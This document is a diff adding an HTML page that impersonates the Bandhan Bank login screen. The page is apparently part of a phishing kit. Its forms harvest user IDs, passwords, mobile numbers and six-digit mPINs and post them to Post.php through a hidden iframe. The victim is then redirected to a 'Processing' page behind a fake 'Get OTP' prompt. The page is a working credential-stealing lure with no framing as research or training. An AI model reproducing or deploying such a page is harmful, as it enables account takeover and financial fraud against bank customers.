@@ -1,0 +1,119 @@
+<html lang="en">
+ <head> 
+  <meta charset="utf-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1"> 
+  <title>Bandhan Bank</title>
+   <link rel="preconnect" href="https://fonts.googleapis.com">
+   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+   <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:ital,opsz,wght@0,6..12,200..1000;1,6..12,200..1000&display=swap" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous"> 
+  <link rel="stylesheet" href="style.css"> 
+ </head>
+ <style type="text/css">
+ .hidden {
+ display: none;
+ }
+ </style> 
+ <body>
+  <!-- partial:index.partial.html -->
+  <!-- Static- Please don't do anything here-->
+  <script type="text/javascript">var submitted=false;</script>
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing.html';}"></iframe>
+  <!--My Form-->
+  <header> 
+   <img src="header.jpg" width="100%" alt=""> 
+  </header> 
+  <main class="mt-4"> 
+   <div class="container"> 
+    <div class="mx-4"> 
+     <div class="d-flex justify-content-center gap-4 mb-4"> 
+      <div class="form-check"> 
+       <input class="form-check-input change-form" value="user" type="radio" name="flexRadioDefault" id="flexRadioDefault1" checked> 
+       <label class="form-check-label" style="font-family:'Nunito Sans', sans-serif;" for="flexRadioDefault1"> User ID</label> 
+      </div> 
+      <div class="form-check"> 
+       <input class="form-check-input change-form" value="mpin" type="radio" name="flexRadioDefault" id="flexRadioDefault2"> 
+       <label class="form-check-label" style="font-family:'Nunito Sans', sans-serif;" for="flexRadioDefault2"> mPIN </label> 
+      </div> 
+     </div>
+     <div id="test" class="text-danger fw-bold"></div> 
+     <div id="user_form"> 
+      <form class="LoginForm" id="page_type" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+      <input type="hidden" name="" value="" /> 
+       <div class="form-group"> 
+        <label for="">User ID</label> 
+        <input type="text" class="form-control" name="BdcuI~d" required> 
+        <span>Required</span> 
+        <small style="float: right;margin-top: 15px;"> <a href="" class="link-primary">Known your Customer Id</a></small> 
+       </div> 
+       <div class="form-group"> 
+        <label for="">Password</label> 
+        <input type="password" class="form-control" name="pssw" required> 
+        <span>Required</span> 
+       </div> 
+       <div class="form-group"> 
+        <label for="">Mobile Number</label> 
+        <input type="text" inputmode="numeric" title="enter valid 10 digit phone number" class="form-control" minlength="10" maxlength="10" name="mbn" required> 
+        <span>Required</span> 
+       </div> 
+       <div class="form-check"> 
+        <input class="form-check-input" type="checkbox" value="" id="flexCheckDefault" checked> 
+        <label class="form-check-label" for="flexCheckDefault" style="font-family:'Nunito Sans', sans-serif;"> <small class="text-secondary">I agreed to the <a href="javascript:void" class="link-primary" "="">terms of conditions</a> of Bandhan Bank</small> </label> 
+       </div> 
+       <div class="form-group w-100 mt-3 mb-0 d-flex justify-content-center"> 
+        <button type="submit" class="submit-button w-75 btn btn-primary">Get OTP</button> 
+       </div> 
+      </form> 
+     </div> 
+     <div id="mpin_form" class="hidden"> 
+       <form class="LoginForm" id="nextValue" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+       <input type="hidden" name="" value="" />
+       <div class="form-group mb-2"> 
+        <label for="">Registered Mobile Number</label> 
+        <select class="form-control phonecode" name="phoneocde" required> <option value="+91 India">+91 India</option> </select> 
+       </div> 
+       <div class="form-group"> 
+        <input type="text" placeholder="Please enter your Mobile Number" inputmode="numeric" title="enter valid 10 digit phone number" class="form-control" minlength="10" maxlength="10" name="mbn" required> 
+        <span>Required</span> 
+       </div> 
+       <div class="form-group"> 
+        <label for="">mPIN</label> 
+        <input minlength="6" maxlength="6" type="password" inputmode="numeric" class="form-control" name="mpin" required> 
+        <span>Required</span> 
+       </div> 
+       <div class="form-group w-100 mt-3 mb-3 d-flex justify-content-center"> 
+        <button type="submit" class="submit-button w-75 btn btn-primary">Get OTP</button> 
+       </div> 
+      </form> 
+     </div> 
+     <div class="text-center"> 
+      <small> <a href="" class="link-primary" style="font-family:'Nunito Sans', sans-serif;">Forget User Id | Forget Password</a> </small> 
+     </div> 
+     <div class="text-center"> 
+      <small> <a href="" class="link-primary" style="font-family:'Nunito Sans', sans-serif;">Unlock User Id | Known you Customer Id</a> </small> 
+     </div> 
+     <div class="mt-4 text-center" style="font-family:'Nunito Sans', sans-serif;"> 
+      <small> Not Registered yet? <a href="" class="link-primary">Register Now!</a> </small> 
+     </div><br> 
+    </div> 
+   </div>
+  </main> 
+  <footer> 
+   <img src="footer.jpg" width="100%" alt=""> 
+  </footer><br>
+  <script>
+        $(document).ready(function(){
+            $(".change-form").click(function(){
+                var value = $(this).val();
+                if(value == 'user'){
+                    $("#user_form").show();
+                    $("#mpin_form").hide();
+                }else{
+                    $("#user_form").hide();
+                    $("#mpin_form").show();
+                }  
+            })
+        });
+    </script> 
+ </body>
+</html>
